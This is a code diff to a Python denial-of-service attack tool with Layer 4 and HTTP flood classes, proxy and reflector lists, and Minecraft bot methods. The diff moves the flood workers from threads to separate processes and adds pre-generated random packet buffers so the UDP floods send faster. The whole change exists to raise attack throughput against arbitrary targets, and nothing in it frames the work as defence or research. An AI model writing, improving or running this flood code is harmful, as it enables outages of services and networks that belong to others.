@@ -36,6 +36,7 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+from multiprocessing import Process
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -164,9 +165,25 @@ REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
 
 
+class PacketBuffer:
+    def __init__(self, buffer_size: int = 100, packet_size: int = 1024):
+        """
+        Inicializa el buffer con paquetes pregenerados.
+        :param buffer_size: Número de paquetes en el buffer.
+        :param packet_size: Tamaño de cada paquete en bytes.
+        """
+        self.buffer = [randbytes(packet_size) for _ in range(buffer_size)]
+
+    def get_payloads(self) -> List[bytes]:
+        """
+        Devuelve el buffer de paquetes.
+        """
+        return self.buffer
+
+
 class Tools:
-    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
-    protocolRex = compile('"protocol":(\d+)')
+    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
+    protocolRex = compile(r'"protocol":(\d+)')
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -210,14 +227,14 @@ class Tools:
         return True
 
     @staticmethod
-    def sendto(sock, packet, target):
+    def sendto(sock, packets: List[bytes], target):
         global BYTES_SEND, REQUESTS_SENT
-        if not sock.sendto(packet, target):
-            return False
-        BYTES_SEND += len(packet)
-        REQUESTS_SENT += 1
+        for packet in packets:
+            if not sock.sendto(packet, target):
+                return False
+            BYTES_SEND += len(packet)
+            REQUESTS_SENT += 1
         return True
-
     @staticmethod
     def dgb_solver(url, ua, pro=None):
         s = None
@@ -273,6 +290,8 @@ class Tools:
                 return s
 
         return False
+
+
 
     @staticmethod
     def safe_close(sock=None):
@@ -367,7 +386,7 @@ class Minecraft:
 
 
 # noinspection PyBroadException,PyUnusedLocal
-class Layer4(Thread):
+class Layer4(Process):
     _method: str
     _target: Tuple[str, int]
     _ref: Any
@@ -382,7 +401,7 @@ class Layer4(Thread):
                  synevent: Event = None,
                  proxies: Set[Proxy] = None,
                  protocolid: int = 74):
-        Thread.__init__(self, daemon=True)
+        Process.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
@@ -463,12 +482,16 @@ class Layer4(Thread):
             Thread(target=self.alive_connection).start()
             REQUESTS_SENT += 1
 
+
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            # Create a reusable buffer of packets
+            packet_buffer = [randbytes(1024) for _ in range(100)]  # Pre-generate 100 packets
+            while Tools.sendto(s, packet_buffer, self._target):
                 continue
         Tools.safe_close(s)
+        
 
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
@@ -642,7 +665,7 @@ class Layer4(Thread):
 
 
 # noinspection PyBroadException,PyUnusedLocal
-class HttpFlood(Thread):
+class HttpFlood(Process):
     _proxies: List[Proxy] = None
     _payload: str
     _defaultpayload: Any
@@ -665,7 +688,7 @@ class HttpFlood(Thread):
                  useragents: Set[str] = None,
                  referers: Set[str] = None,
                  proxies: Set[Proxy] = None) -> None:
-        Thread.__init__(self, daemon=True)
+        Process.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._thread_id = thread_id
         self._synevent = synevent
@@ -1569,8 +1592,7 @@ if __name__ == '__main__':
                 urlraw = "http://" + urlraw
 
             if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" %
-                     ", ".join(Methods.ALL_METHODS))
+                exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
             if method in Methods.LAYER7_METHODS:
                 url = URL(urlraw)
@@ -1586,8 +1608,7 @@ if __name__ == '__main__':
                 rpc = int(argv[6])
                 timer = int(argv[7])
                 proxy_ty = int(argv[3].strip())
-                proxy_li = Path(__dir__ / "files/proxies/" /
-                                argv[5].strip())
+                proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
                 useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
                 bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1608,12 +1629,10 @@ if __name__ == '__main__':
                 if not useragent_li.exists():
                     exit("The Useragent file doesn't exist ")
                 if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
+                    exit("The Referrer file doesn't exist ")
 
-                uagents = set(a.strip()
-                              for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip()
-                               for a in referers_li.open("r+").readlines())
+                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
+                referers = set(a.strip() for a in referers_li.open("r+").readlines())
 
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
@@ -1621,13 +1640,13 @@ if __name__ == '__main__':
                 if threads > 1000:
                     logger.warning("Thread is higher than 1000")
                 if rpc > 100:
-                    logger.warning(
-                        "RPC (Request Pre Connection) is higher than 100")
+                    logger.warning("RPC (Request Pre Connection) is higher than 100")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                    # Usamos Process en lugar de Thread
+                    p = HttpFlood(thread_id, url, host, method, rpc, event, uagents, referers, proxies)
+                    p.start()
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
@@ -1672,8 +1691,7 @@ if __name__ == '__main__':
                                 exit("The reflector file doesn't exist")
                             if len(argv) == 7:
                                 logger.setLevel("DEBUG")
-                            ref = set(a.strip()
-                                      for a in Tools.IP.findall(refl_li.open("r").read()))
+                            ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                             if not ref: exit("Empty Reflector File ")
 
                         elif argfive.isdigit() and len(argv) >= 7:
@@ -1687,9 +1705,9 @@ if __name__ == '__main__':
 
                         else:
                             logger.setLevel("DEBUG")
-                
+
                 protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                
+
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
@@ -1697,13 +1715,14 @@ if __name__ == '__main__':
 
                         protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
-                        
+
                         if 47 < protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
                 for _ in range(threads):
-                    Layer4((target, port), ref, method, event,
-                           proxies, protocolid).start()
+                    # Usamos Process en lugar de Thread
+                    p = Layer4((target, port), ref, method, event, proxies, protocolid)
+                    p.start()
 
             logger.info(
                 f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
